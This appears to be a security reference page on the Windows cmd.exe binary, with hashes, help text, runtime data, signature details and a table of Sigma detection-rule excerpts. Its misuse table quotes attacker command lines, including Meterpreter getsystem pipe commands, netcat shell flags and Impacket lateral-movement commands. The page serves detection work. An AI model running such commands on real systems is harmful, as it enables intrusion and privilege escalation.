﻿---
title: cmd.exe | Windows Command Processor
excerpt: What is cmd.exe?
---

# cmd.exe 

* File Path: `C:\Windows\system32\cmd.exe`
* Description: Windows Command Processor

## Hashes

Type | Hash
-- | --
MD5 | `975B45B669930B0CC773EAF2B414206F`
SHA1 | `8C5437CD76A89EC983E3B364E219944DA3DAB464`
SHA256 | `3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2`
SHA384 | `B2E8BB5140B7C76AD97CDE056F5CF3594E08630252431B366E11A5FAC77C6623C095821B474169B67EE9E69F5ACC79E1`
SHA512 | `F08B7131BB3F5BB941C0445FC01B592AECFF6ADCB58E1803643073C44CF49BA11A5309B0DCF93C9CD91D60D2753DAFFA86CE4A882C74EB5C912CA0ADCCEB257D`
SSDEEP | `6144:xRekiTbWl/hVKhSuEAIKUa86F7iENfeLHl6OUtdSJm:u3TbA/hVCrIKUaNF7iEN2LHwP+J`
IMP | `272245E2988E1E430500B852C4FB5E18`
PESHA1 | `B647000BC9250724925FB8ECCB839DFAB152E631`
PE256 | `5E630BE0CDC281C008F85A1772423DB21E5B8FFCF10337521589EFA0B4ADE6E2`

## Runtime Data

### Usage (stdout):
```cmhg
Starts a new instance of the Windows command interpreter

CMD [/A | /U] [/Q] [/D] [/E:ON | /E:OFF] [/F:ON | /F:OFF] [/V:ON | /V:OFF]
    [[/S] [/C | /K] string]

/C      Carries out the command specified by string and then terminates
/K      Carries out the command specified by string but remains
/S      Modifies the treatment of string after /C or /K (see below)
/Q      Turns echo off
/D      Disable execution of AutoRun commands from registry (see below)
/A      Causes the output of internal commands to a pipe or file to be ANSI
/U      Causes the output of internal commands to a pipe or file to be
        Unicode
/T:fg   Sets the foreground/background colors (see COLOR /? for more info)
/E:ON   Enable command extensions (see below)
/E:OFF  Disable command extensions (see below)
/F:ON   Enable file and directory name completion characters (see below)
/F:OFF  Disable file and directory name completion characters (see below)
/V:ON   Enable delayed environment variable expansion using ! as the
        delimiter. For example, /V:ON would allow !var! to expand the
        variable var at execution time.  The var syntax expands variables
        at input time, which is quite a different thing when inside of a FOR
        loop.
/V:OFF  Disable delayed environment expansion.

Note that multiple commands separated by the command separator '&&'
are accepted for string if surrounded by quotes.  Also, for compatibility
reasons, /X is the same as /E:ON, /Y is the same as /E:OFF and /R is the
same as /C.  Any other switches are ignored.

If /C or /K is specified, then the remainder of the command line after
the switch is processed as a command line, where the following logic is
used to process quote (") characters:

    1.  If all of the following conditions are met, then quote characters
        on the command line are preserved:

        - no /S switch
        - exactly two quote characters
        - no special characters between the two quote characters,
          where special is one of: &<>()@^|
        - there are one or more whitespace characters between the
          two quote characters
        - the string between the two quote characters is the name
          of an executable file.

    2.  Otherwise, old behavior is to see if the first character is
        a quote character and if so, strip the leading character and
        remove the last quote character on the command line, preserving
        any text after the last quote character.

If /D was NOT specified on the command line, then when CMD.EXE starts, it
looks for the following REG_SZ/REG_EXPAND_SZ registry variables, and if
either or both are present, they are executed first.

    HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\AutoRun

        and/or

    HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun

Command Extensions are enabled by default.  You may also disable
extensions for a particular invocation by using the /E:OFF switch.  You
can enable or disable extensions for all invocations of CMD.EXE on a
machine and/or user logon session by setting either or both of the
following REG_DWORD values in the registry using REGEDIT.EXE:

    HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\EnableExtensions

        and/or

    HKEY_CURRENT_USER\Software\Microsoft\Command Processor\EnableExtensions

to either 0x1 or 0x0.  The user specific setting takes precedence over
the machine setting.  The command line switches take precedence over the
registry settings.

In a batch file, the SETLOCAL ENABLEEXTENSIONS or DISABLEEXTENSIONS arguments
takes precedence over the /E:ON or /E:OFF switch. See SETLOCAL /? for details.

The command extensions involve changes and/or additions to the following
commands:

    DEL or ERASE
    COLOR
    CD or CHDIR
    MD or MKDIR
    PROMPT
    PUSHD
    POPD
    SET
    SETLOCAL
    ENDLOCAL
    IF
    FOR
    CALL
    SHIFT
    GOTO
    START (also includes changes to external command invocation)
    ASSOC
    FTYPE

To get specific details, type commandname /? to view the specifics.

Delayed environment variable expansion is NOT enabled by default.  You
can enable or disable delayed environment variable expansion for a
particular invocation of CMD.EXE with the /V:ON or /V:OFF switch.  You
can enable or disable delayed expansion for all invocations of CMD.EXE on a
machine and/or user logon session by setting either or both of the
following REG_DWORD values in the registry using REGEDIT.EXE:

    HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\DelayedExpansion

        and/or

    HKEY_CURRENT_USER\Software\Microsoft\Command Processor\DelayedExpansion

to either 0x1 or 0x0.  The user specific setting takes precedence over
the machine setting.  The command line switches take precedence over the
registry settings.

In a batch file the SETLOCAL ENABLEDELAYEDEXPANSION or DISABLEDELAYEDEXPANSION
arguments takes precedence over the /V:ON or /V:OFF switch. See SETLOCAL /?
for details.

If delayed environment variable expansion is enabled, then the exclamation
character can be used to substitute the value of an environment variable
at execution time.

You can enable or disable file name completion for a particular
invocation of CMD.EXE with the /F:ON or /F:OFF switch.  You can enable
or disable completion for all invocations of CMD.EXE on a machine and/or
user logon session by setting either or both of the following REG_DWORD
values in the registry using REGEDIT.EXE:

    HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\CompletionChar
    HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\PathCompletionChar

        and/or

    HKEY_CURRENT_USER\Software\Microsoft\Command Processor\CompletionChar
    HKEY_CURRENT_USER\Software\Microsoft\Command Processor\PathCompletionChar

with the hex value of a control character to use for a particular
function (e.g.  0x4 is Ctrl-D and 0x6 is Ctrl-F).  The user specific
settings take precedence over the machine settings.  The command line
switches take precedence over the registry settings.

If completion is enabled with the /F:ON switch, the two control
characters used are Ctrl-D for directory name completion and Ctrl-F for
file name completion.  To disable a particular completion character in
the registry, use the value for space (0x20) as it is not a valid
control character.

Completion is invoked when you type either of the two control
characters.  The completion function takes the path string to the left
of the cursor appends a wild card character to it if none is already
present and builds up a list of paths that match.  It then displays the
first matching path.  If no paths match, it just beeps and leaves the
display alone.  Thereafter, repeated pressing of the same control
character will cycle through the list of matching paths.  Pressing the
Shift key with the control character will move through the list
backwards.  If you edit the line in any way and press the control
character again, the saved list of matching paths is discarded and a new
one generated.  The same occurs if you switch between file and directory
name completion.  The only difference between the two control characters
is the file completion character matches both file and directory names,
while the directory completion character only matches directory names.
If file completion is used on any of the built in directory commands
(CD, MD or RD) then directory completion is assumed.

The completion code deals correctly with file names that contain spaces
or other special characters by placing quotes around the matching path.
Also, if you back up, then invoke completion from within a line, the
text to the right of the cursor at the point completion was invoked is
discarded.

The special characters that require quotes are:
     <space>
     &()[]{}^=;!'+,`~

```

### Child Processes:
conhost.exe

### Open Handles:

Path | Type
-- | --
(R-D)   C:\Windows\System32\en-US\cmd.exe.mui | File
(RW-)   C:\Users\user | File
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*{6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.ver0x0000000000000004.db | Section
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000004.db | Section
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*cversions.2.ro | Section
\BaseNamedObjects\NLS_CodePage_1252_3_2_0_0 | Section
\BaseNamedObjects\NLS_CodePage_437_3_2_0_0 | Section


### Loaded Modules:

Path |
-- |
C:\Windows\System32\bcryptPrimitives.dll |
C:\Windows\system32\cmd.exe |
C:\Windows\System32\combase.dll |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\System32\msvcrt.dll |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\RPCRT4.dll |
C:\Windows\System32\ucrtbase.dll |
C:\Windows\SYSTEM32\winbrand.dll |


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: Cmd.Exe.MUI
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.17763.1 (WinBuild.160101.0800)
* Product Version: 10.0.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/71
* VirusTotal Link: https://www.virustotal.com/gui/file/3656f37a1c6951ec4496fabb8ee957d3a6e3c276d5a3785476b482c9c0d32ea2/detection/


## Possible Misuse

*The following table contains possible examples of `cmd.exe` being misused. While `cmd.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [godmode_sigma_rule.yml](https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [net_susp_dns_txt_exec_strings.yml](https://github.com/Neo23x0/sigma/blob/master/rules/network/net_susp_dns_txt_exec_strings.yml) | `- 'cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_asr_bypass_via_appvlp_re.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_asr_bypass_via_appvlp_re.yml) | `CommandLine\|re: '(?i).*appvlp.exe.*(cmd.exe\|powershell.exe).*(.sh\|.exe\|.dll\|.bin\|.bat\|.cmd\|.js\|.msh\|.reg\|.scr\|.ps\|.vb\|.jar\|.pl\|.inf)'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_meterpreter_or_cobaltstrike_getsystem_service_installation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_meterpreter_or_cobaltstrike_getsystem_service_installation.yml) | `# meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 > \\.\pipe\5e120a`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_meterpreter_or_cobaltstrike_getsystem_service_installation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_meterpreter_or_cobaltstrike_getsystem_service_installation.yml) | `- 'cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_security_meterpreter_or_cobaltstrike_getsystem_service_install.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_security_meterpreter_or_cobaltstrike_getsystem_service_install.yml) | `# meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 > \\.\pipe\5e120a`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_security_meterpreter_or_cobaltstrike_getsystem_service_install.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_security_meterpreter_or_cobaltstrike_getsystem_service_install.yml) | `- 'cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_logon_explicit_credentials.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_susp_logon_explicit_credentials.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_rclone_exec.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/deprecated/win_susp_rclone_exec.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [driver_load_meterpreter_or_cobaltstrike_getsystem_service_installation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/driver_load/driver_load_meterpreter_or_cobaltstrike_getsystem_service_installation.yml) | `# meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 > \\.\pipe\5e120a`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [driver_load_meterpreter_or_cobaltstrike_getsystem_service_installation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/driver_load/driver_load_meterpreter_or_cobaltstrike_getsystem_service_installation.yml) | `- 'cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_dbghelp_dbgcore_load.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_suspicious_dbghelp_dbgcore_load.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_mal_blue_mockingbird.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/malware/process_creation_mal_blue_mockingbird.yml) | `Image\|endswith: '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_shell_spawn_from_winrm.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_access/win_susp_shell_spawn_from_winrm.yml) | `- '*\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_stickykey_like_backdoor.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_stickykey_like_backdoor.yml) | `Image\|endswith: '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_susp_del.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_susp_del.yml) | `#cmd.exe (PID: 1044 cmdline: 'C:\Windows\System32\cmd.exe' /c taskkill /im A8D4.exe /f & timeout /t 6 & del /f /q 'C:\Users\user~1\AppData\Local\Temp\A8D4.exe' & del C:\ProgramData\*.dll & exit `{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_abusing_debug_privilege.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/sysmon_abusing_debug_privilege.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_always_install_elevated_msi_spawned_cmd_and_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/sysmon_always_install_elevated_msi_spawned_cmd_and_powershell.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_netcat_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/sysmon_netcat_execution.yml) | `- ' --exec cmd.exe '`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_vmtoolsd_susp_child_process.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/sysmon_vmtoolsd_susp_child_process.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_babyshark.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_babyshark.yml) | `- cmd.exe /c taskkill /im cmd.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_elise.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_elise.yml) | `Image: 'C:\Windows\SysWOW64\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_greenbug_may20.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_greenbug_may20.yml) | `- '8989 -e cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_greenbug_may20.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_greenbug_may20.yml) | `- 'CSIDL_SYSTEM\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_lazarus_loader.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_lazarus_loader.yml) | `- 'cmd.exe /c '`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_unc2452_cmds.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_unc2452_cmds.yml) | `CommandLine\|contains: 'cmd.exe /C '`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_attrib_hiding_files.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_attrib_hiding_files.yml) | `ParentImage\|endswith: '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_attrib_hiding_files.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_attrib_hiding_files.yml) | `- igfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe)`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_cobaltstrike_process_patterns.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_cobaltstrike_process_patterns.yml) | `CommandLine\|contains: '\cmd.exe /C whoami'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_cobaltstrike_process_patterns.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_cobaltstrike_process_patterns.yml) | `- 'cmd.exe /C echo'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_cobaltstrike_process_patterns.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_cobaltstrike_process_patterns.yml) | `- 'cmd.exe /c echo'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_cobaltstrike_process_patterns.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_cobaltstrike_process_patterns.yml) | `Image\|endswith: '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_commandline_path_traversal.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_commandline_path_traversal.yml) | `title: Cmd.exe CommandLine Path Traversal`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_commandline_path_traversal.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_commandline_path_traversal.yml) | `description: detects the usage of path traversal in cmd.exe indicating possible command/argument confusion/hijacking`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_commandline_path_traversal.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_commandline_path_traversal.yml) | `- https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_exploit_cve_2019_1378.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_2019_1378.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_exploit_cve_2020_10189.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_2020_10189.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_hack_koadic.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_hack_koadic.yml) | `Image\|endswith: '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_html_help_spawn.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_html_help_spawn.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_impacket_lateralization.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml) | `#       cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1567439113.54 2>&1`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_impacket_lateralization.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml) | `#       cmd.exe /Q /c cd  1> \\127.0.0.1\ADMIN$\__1567439113.54 2>&1`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_impacket_lateralization.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml) | `#       "C:\Windows\System32\cmd.exe" /Q /c cd  1> \\127.0.0.1\ADMIN$\__1567442499.05 2>&1`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_impacket_lateralization.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml) | `#   "C:\Windows\System32\cmd.exe" /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1567520103.71 2>&1`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_impacket_lateralization.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml) | `#       C:\Windows\system32\cmd.exe /Q /c echo tasklist ^> \\127.0.0.1\C$\__output 2^>^&1 > C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_impacket_lateralization.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml) | `- 'cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_impacket_lateralization.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml) | `# cmd.exe /C tasklist /m > C:\Windows\Temp\bAJrYQtL.tmp 2>&1`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_local_system_owner_account_discovery.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_local_system_owner_account_discovery.yml) | `- Image\|endswith: '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_local_system_owner_account_discovery.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_local_system_owner_account_discovery.yml) | `- ' rmdir '       # don't match on 'dir'   "C:\Windows\System32\cmd.exe" /q /c rmdir /s /q "C:\Users\XX\AppData\Local\Microsoft\OneDrive\19.232.1124.0005"`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_malware_trickbot_recon_activity.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_malware_trickbot_recon_activity.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_meterpreter_or_cobaltstrike_getsystem_service_start.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_meterpreter_or_cobaltstrike_getsystem_service_start.yml) | `# meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 > \\.\pipe\5e120a`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_meterpreter_or_cobaltstrike_getsystem_service_start.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_meterpreter_or_cobaltstrike_getsystem_service_start.yml) | `- 'cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mmc_spawn_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mmc_spawn_shell.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_monitoring_for_persistence_via_bits.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_monitoring_for_persistence_via_bits.yml) | `CommandLine\|re: '(?i).*bitsadmin.*\/SetNotifyCmdLine.*(%COMSPEC%\|cmd.exe\|regsvr32.exe).*'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mshta_spawn_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_spawn_shell.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_office_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
